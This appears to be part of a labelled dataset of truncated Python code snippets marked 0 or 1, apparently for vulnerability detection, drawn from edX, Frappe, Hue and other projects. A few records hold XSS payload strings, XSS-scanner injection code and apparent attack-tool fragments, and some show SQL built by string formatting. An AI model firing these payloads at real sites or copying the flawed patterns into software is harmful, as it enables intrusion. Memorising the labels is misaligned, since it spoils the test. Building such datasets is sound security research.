"label": 0}, {"snippet_id": 20136, "code": "(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers", "label": 0}, {"snippet_id": 38284, "code": ")) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1", "label": 0}, {"snippet_id": 43131, "code": "\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or df.fieldtype=='Datetime': \t\t\t\tvalue=str(values.get(fieldname)) \t\t\telse: \t\t\t\tvalue =values.get(fieldname", "label": 0}, {"snippet_id": 36132, "code": "\" \t\tif not hasattr(self, \"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key", "label": 0}, {"snippet_id": 44913, "code": " workflow_json=json.loads(request.POST.get('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response['status']=0 response['xml']=workflow.to_xml() except Exception, e: response['message']=str", "label": 0}, {"snippet_id": 19468, "code": "--process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual", "label": 0}, {"snippet_id": 36897, "code": ".title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"", "label": 1}, {"snippet_id": 15445, "code": "() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite", "label": 0}, {"snippet_id": 22556, "code": "(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings", "label": 0}, {"snippet_id": 46629, "code": " get_context_data(self): data=super().get_context_data() data['life_conditions']=LifeCondition.objects.with_benefits() return data class BenefitClaimView(FormView): template_name='core/benefit_claim.html", "label": 0}, {"snippet_id": 31449, "code": "\"Date\", \"curr_con\", source=source, alpha=0.5, color=' \t\tp[serv].line(\"Date\", \"curr_ssl_con\", source=source, alpha=0.5, color=\" \t\tp[serv].line(\"Date\", \"sess_rate\", source=source, alpha=0.5, color=\" \t\tp[serv", "label": 0}, {"snippet_id": 35865, "code": "=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values", "label": 0}, {"snippet_id": 21523, "code": "'staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/", "label": 0}, {"snippet_id": 32503, "code": " value) return value class Server(SocketServer.TCPServer): def __init__(self, server_address, top_level): SocketServer.TCPServer.__init__(self, server_address, Handler) self.top_level=top_level def server_bind", "label": 0}, {"snippet_id": 29843, "code": "(serv, commands, ip=\"1\") \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') if form.getvalue('checkSshConnect') is not None and serv is not None: \ttry", "label": 0}, {"snippet_id": 54818, "code": " **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT']) return context def test_func(self): return self.request.user==self.get_object", "label": 0}, {"snippet_id": 29673, "code": "(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True) \tstdout, stderr=p.communicate() \toutput=stdout.splitlines() \t \treturn output, stderr def show_backends(serv, *", "label": 0}, {"snippet_id": 39762, "code": "\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname", "label": 0}, {"snippet_id": 5393, "code": "'onbeforescriptexecute', 'onbeforeunload', 'onbegin', 'onblur', 'oncanplay', 'oncanplaythrough', 'onchange', 'onclick', 'oncontextmenu', 'oncopy', 'oncut', 'ondblclick', 'ondrag', 'ondragend', 'ondragenter", "label": 0}, {"snippet_id": 8810, "code": "), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press", "label": 0}, {"snippet_id": 4923, "code": "'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm", "label": 0}, {"snippet_id": 11524, "code": ".views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student", "label": 0}, {"snippet_id": 18183, "code": " url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\")", "label": 0}, {"snippet_id": 16016, "code": "'--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir", "label": 0}, {"snippet_id": 25977, "code": " 'company', 'name_parts', 'street', 'zipcode', 'city', 'country', 'vat_id', 'internal_reference', 'beneficiary') widgets={ 'is_business': BusinessBooleanRadio, 'street': forms.Textarea(attrs={'rows': 2", "label": 0}, {"snippet_id": 1985, "code": ").netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss", "label": 0}, {"snippet_id": 36469, "code": ".file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter", "label": 0}, {"snippet_id": 10837, "code": ".makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize", "label": 0}, {"snippet_id": 44843, "code": "='pig': parameters=parameters.union(set(find_dollar_variables(data))) response['status']=0 response['parameters']=list(parameters) except Exception, e: response['message']=str(e) return HttpResponse(json", "label": 0}, {"snippet_id": 36527, "code": " out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t", "label": 0}, {"snippet_id": 23548, "code": "('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get(", "label": 0}, {"snippet_id": 32031, "code": " from django.utils.translation import ungettext_lazy from horizon import tables from openstack_dashboard import api class CreateMappingLink(tables.LinkAction): name=\"create\" verbose_name=_(\"Create Mapping", "label": 0}, {"snippet_id": 13999, "code": "]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems", "label": 0}, {"snippet_id": 48805, "code": " smart_lists.filters import SmartListFilter class TitleFromModelFieldMixin(object): def get_title(self): if self.label: return self.label elif self.model_field: return self.model_field.verbose_name.title", "label": 0}, {"snippet_id": 51190, "code": "=DashboardUser can_delete=False verbose_name_plural='Dashboard Users' class UserResource(resources.ModelResource): class Meta: model=User class GroupResource(resources.ModelResource): class Meta: model", "label": 0}, {"snippet_id": 15699, "code": " session unless interrupted. \"\"\" print 'Bok-choy servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while", "label": 0}, {"snippet_id": 35500, "code": ".is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t", "label": 0}, {"snippet_id": 7821, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary", "label": 0}, {"snippet_id": 22204, "code": "'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r", "label": 0}, {"snippet_id": 40315, "code": "\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit", "label": 1}, {"snippet_id": 22764, "code": "<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P", "label": 1}, {"snippet_id": 33853, "code": "\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache()", "label": 0}, {"snippet_id": 8867, "code": " continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key", "label": 0}, {"snippet_id": 5345, "code": "'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', ", "label": 0}, {"snippet_id": 37042, "code": ".db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t", "label": 0}, {"snippet_id": 2322, "code": "%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\",", "label": 0}, {"snippet_id": 54787, "code": " return context def form_valid(self, form): a=form.save(commit=False) a.author=self.request.user a.save() return super().form_valid(form) class ArticleUpdateView(UserPassesTestMixin, UpdateView): \"\"\"\u5904\u7406\u66f4\u65b0", "label": 0}, {"snippet_id": 11550, "code": ".views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$", "label": 0}, {"snippet_id": 22326, "code": " url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done", "label": 0}, {"snippet_id": 18718, "code": "'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware", "label": 0}, {"snippet_id": 37725, "code": " comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ ", "label": 0}, {"snippet_id": 4198, "code": ".logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid", "label": 0}, {"snippet_id": 38365, "code": "\"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image", "label": 0}, {"snippet_id": 2527, "code": "=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post.body) if db_update is", "label": 1}, {"snippet_id": 6514, "code": "(self.section, 'sso_session_lifetime') @property def sso_session_mongo_uri(self): \"\"\" SSO session MongoDB connection URI(string). See MongoDB documentation for details. If not set, an in-memory SSO session", "label": 0}, {"snippet_id": 45579, "code": ")] return render('editor/bundle_editor.mako', request,{ 'bundle_json': bundle.json, 'coordinators_json': json.dumps(coordinators), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps", "label": 1}, {"snippet_id": 6957, "code": " url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user", "label": 0}, {"snippet_id": 44780, "code": "\") def action_parameters(request): response={'status': -1} parameters=set() try: node_data=json.loads(request.POST.get('node', '{}')) parameters=parameters.union(set(Node(node_data).find_parameters()))", "label": 0}, {"snippet_id": 39331, "code": ".db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns", "label": 0}, {"snippet_id": 41437, "code": "'Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)", "label": 0}, {"snippet_id": 45927, "code": ".dashboard_api import get_engine from dashboard.decorators import allow_owner_only from dashboard.models import Collection2 from dashboard.conf import get_engines from dashboard.controller import DashboardController", "label": 0}, {"snippet_id": 28107, "code": " jinja2 import Environment, FileSystemLoader env=Environment(loader=FileSystemLoader('templates/')) template=env.get_template('config.html') print('Content-type: text/html\\n') funct.check_login() form=cgi", "label": 1}, {"snippet_id": 25297, "code": ", value, attrs=None, renderer=None) -> str: if not isinstance(value, list): value=self.decompress(value) output=[] final_attrs=self.build_attrs(attrs or dict()) if 'required' in final_attrs: del final_attrs", "label": 0}, {"snippet_id": 20316, "code": " test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self", "label": 0}, {"snippet_id": 29331, "code": "-c -f \" +tmp_file +\"&& sudo rm -f \" +tmp_file] \t\telif kwargs.get(\"just_save\")==\"save\": \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path", "label": 0}, {"snippet_id": 41588, "code": " import display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype)", "label": 0}, {"snippet_id": 8455, "code": " import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin", "label": 0}, {"snippet_id": 51797, "code": " ValueError('FIELD_ENCRYPTION_KEY has to be configured on the OS level, and needs to be different than the ' 'default key provided. Please create a new key. Instructions are listed here:' 'https://github.com", "label": 0}, {"snippet_id": 38130, "code": " \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt", "label": 1}, {"snippet_id": 14624, "code": "--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules", "label": 0}, {"snippet_id": 19175, "code": "--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file", "label": 0}, {"snippet_id": 8816, "code": " 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release", "label": 0}, {"snippet_id": 13006, "code": " patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES", "label": 0}, {"snippet_id": 33378, "code": ", webapp2.Route(r'/internal/cron/buildbucket/bq-export-prod', bq.CronExportBuildsProd), webapp2.Route(r'/internal/cron/buildbucket/bq-export-experimental', bq.CronExportBuildsExperimental), webapp2.Route", "label": 0}, {"snippet_id": 10056, "code": "/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' ", "label": 0}, {"snippet_id": 9939, "code": "'ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 31240, "code": " import timedelta \tfrom bokeh.plotting import figure, output_file, show \tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker \tfrom bokeh.layouts import widgetbox, gridplot", "label": 0}, {"snippet_id": 9157, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook", "label": 1}, {"snippet_id": 5783, "code": "<source></source></video>', '<form><button formaction=\"javascript:alert(1)\">X</button>', '<math href=\"javascript:alert(1)\">CLICKME</math>', '<link rel=\"import\" href=\"test.svg\" />', '<iframe srcdoc=\"&lt", "label": 0}, {"snippet_id": 45773, "code": "=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_bundle', kwargs={'doc_id': bundle.id}) }, force_template=True).content return HttpResponse", "label": 0}, {"snippet_id": 4001, "code": ",headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse", "label": 0}, {"snippet_id": 37170, "code": ".comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category", "label": 0}, {"snippet_id": 51328, "code": ".FIELD_ENCRYPTION_KEY) encrypted=f.encrypt(obj.internet_nl_api_password.encode()) obj.internet_nl_api_password=encrypted super().save_model(request, obj, form, change) actions=[] @admin.register(UrlList)", "label": 0}, {"snippet_id": 20626, "code": ", name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name", "label": 0}, {"snippet_id": 44175, "code": " import reverse from django.forms.formsets import formset_factory from django.http import HttpResponse from django.shortcuts import redirect from django.utils.translation import ugettext as _ from desktop", "label": 0}, {"snippet_id": 38660, "code": " isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None", "label": 0}, {"snippet_id": 22017, "code": "), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log')", "label": 0}, {"snippet_id": 54277, "code": "\"] prox+=bane.http(200) global target target=Entry(main) target.insert(0,'http://') global cookie cookie=Entry(main) global method method=ttk.Combobox(main, values=[\"GET & POST\", \"GET\", \"POST\"]) global", "label": 0}, {"snippet_id": 38900, "code": ": \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument)", "label": 0}, {"snippet_id": 45537, "code": "': bundles }) @check_document_access_permission() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc", "label": 0}, {"snippet_id": 19915, "code": "'VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self", "label": 1}, {"snippet_id": 51737, "code": "'internet_nl_dashboard.uploadlog'}, ]}, {'label': _('\ud83d\udd52 Periodic Tasks'), 'items':[ {'name': 'app.job'}, {'name': 'django_celery_beat.periodictask'}, {'name': 'django_celery_beat.crontabschedule'}, ]}, ] MEDIA_ROOT=os", "label": 0}, {"snippet_id": 17947, "code": ")$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$", "label": 0}, {"snippet_id": 30529, "code": "\tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \tapache_log_path", "label": 0}, {"snippet_id": 46069, "code": "\"Dashboard does not exist or you don't have the permission to access it.\")) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} if request.method=='GET': if 'q' in request.GET: query['qs'][0]['q']=request.GET.get(", "label": 1}, {"snippet_id": 31784, "code": ":0\">'+form.getvalue('color')+' list was created</div>') \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n create new '+form.getvalue('color')+' list. %s </div>' % e", "label": 0}, {"snippet_id": 10256, "code": " self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir", "label": 0}, {"snippet_id": 7447, "code": ".*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses", "label": 0}, {"snippet_id": 53404, "code": "(request.user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json.loads(request.POST.get('bundle'", "label": 0}, {"snippet_id": 42324, "code": ".get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t", "label": 0}, {"snippet_id": 35553, "code": "\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get", "label": 0}, {"snippet_id": 35858, "code": "\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content", "label": 0}, {"snippet_id": 3526, "code": "=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0", "label": 0}, {"snippet_id": 51551, "code": " 'OPTIONS':{ 'context_processors':[ 'constance.context_processors.config', 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors", "label": 0}, {"snippet_id": 6739, "code": "') @property def base_url(self): \"\"\" Base URL of the IdP. The default base URL is constructed from the Request URI, but for example if there is a load balancer/SSL terminator in front of the IdP it might", "label": 0}, {"snippet_id": 17391, "code": "/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings", "label": 0}, {"snippet_id": 7164, "code": "(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views", "label": 0}, {"snippet_id": 18445, "code": "=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 41306, "code": "\t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(", "label": 0}, {"snippet_id": 47399, "code": ".authuser.username +'\"</h3>')) f.add_content(PlainText('<a href=\"/admin/media/select?action_url=/admin/actions/change-user-avatar' '&payload=' +str(user_id) +'\"><img class=\"button-img\" alt=\"Change avatar\" ' ", "label": 0}, {"snippet_id": 20614, "code": " urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"", "label": 0}, {"snippet_id": 24405, "code": ", *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs) self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get", "label": 0}, {"snippet_id": 40587, "code": "\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname", "label": 0}, {"snippet_id": 28116, "code": "')) template=env.get_template('config.html') print('Content-type: text/html\\n') funct.check_login() form=cgi.FieldStorage() serv=form.getvalue('serv') config_read=\"\" cfg=\"\" stderr=\"\" error=\"\" aftersave", "label": 1}, {"snippet_id": 32785, "code": "\"%(num)s\" ' 'onclick=\"window.location.hash=%(quot)s '%(num)s</a></td>' '<td class=\"FileContents-lineContents\">%(line)s</td></tr>') %{'num': i, 'quot': \"'\", 'line': line}) self.wfile.write('</table>') self", "label": 0}, {"snippet_id": 46966, "code": " Comment.sync_filter(post_id=self.id, orderings=['-id']) @property @cache(MC_KEY_N_COMMENTS %('{self.id}')) async def n_comments(self): return await Comment.filter(post_id=self.id).count() @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER", "label": 0}, {"snippet_id": 51232, "code": "=\"\" for group in obj.groups.all(): value +=group.name return value class GroupAdmin(BaseGroupAdmin, ImportExportModelAdmin): resource_class=GroupResource admin.site.unregister(User) admin.site.register", "label": 0}, {"snippet_id": 2462, "code": " if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\"", "label": 0}, {"snippet_id": 20430, "code": "', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses", "label": 0}, {"snippet_id": 10797, "code": " DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') 